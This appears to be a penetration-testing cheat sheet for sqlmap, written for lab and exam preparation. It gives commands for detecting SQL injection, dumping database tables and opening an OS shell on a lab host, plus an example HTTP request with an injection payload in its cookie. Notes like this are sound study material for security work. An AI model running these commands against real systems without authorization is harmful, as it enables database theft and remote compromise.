## sqlmap - SQL Injection Automator

### DO NOT USE ON OSCP EXAM

This tool will identify and exploit SQL injection vulnerabilities against various database engines.

- To use, specify the URL you wish to scan, including an example of the parameters, and specify which parameter to test.

  ```bash
  sqlmap -u http://192.168.216.10/debug.php?id=1 -p "id"
  
  # Options
  -u	# Specify the full URL with parameters
  -p	# Specify the parameter to investigate.
  ```

The process may stop at one point without any prompt.  If you hit 'enter' it will ask if you wish to continue testing for certain risk values.  Answer this and the scan will continue and present more prompts.

- To dump all the tables to stdout and a CSV file:

  ```bash
  sqlmap -u http://192.168.216.10/debug.php?id=1 -p "id" --dbms=mysql --dump
  
  # Options
  --dbms=mysql	# Specifies MySQL/MariaDB as the backend type
  --dump			# Dumps the contents of all tables in the DB
  ```

- To execute a shell on the system:

  ```bash
  sqlmap -u http://192.168.216.10/debug.php?id=1 -p "id" --dbms=mysql --os-shell
  ```


### Cookie Injections

If the parameter is located in a cookie and not in the URL, you will need to get a copy of a GET Request with the cookie in it, then figure out where the SQL Injection vulnerability exists and mark it with an `*`.  Save that in a file and feed it to sqlmap.

Example Get Request (note the asterisk marked in the 'Cookie' line):

```html
GET / HTTP/1.1
Host: sandbox.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wp_sap=["1650149780')) OR 1=2 *#"];
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

Test with this command:

```bash
sqlmap -r getrequest.txt --level 2 --dbms=mysql -p"wp_sap"

# Options
-r	# GET Request
--level 2	# Level 2 tells it to try injections in cookies, is redundant with the * marker
--dbms=mysql	# Just tests for MYSQL commands
-p"wp_sap"	# Tells it specifically what parameter to test, but is redundant with the * marker
```

Once you know it's injectable, you can run other commands.

```bash
# Enumerate tables from Database EXAMPLE.  You don't need to specify the database if there's only one.
sqlmap -r getrequest.txt --level 2 --dbms=mysql -p"wp_sap" -D'EXAMPLE' --tables

# Enumerate columns from table SAMPLE
sqlmap -r getrequest.txt --level 2 --dbms=mysql -p"wp_sap" -T'SAMPLE' --columns

# Get data from a table SAMPLE, column COL1
sqlmap -r getrequest.txt --level 2 --dbms=mysql -p"wp_sap" -T'SAMPLE' --dump-all
```





### Links:

Cookie SQL Injections - https://corenumb.wordpress.com/2012/06/09/mysql-injection-trough-cookies/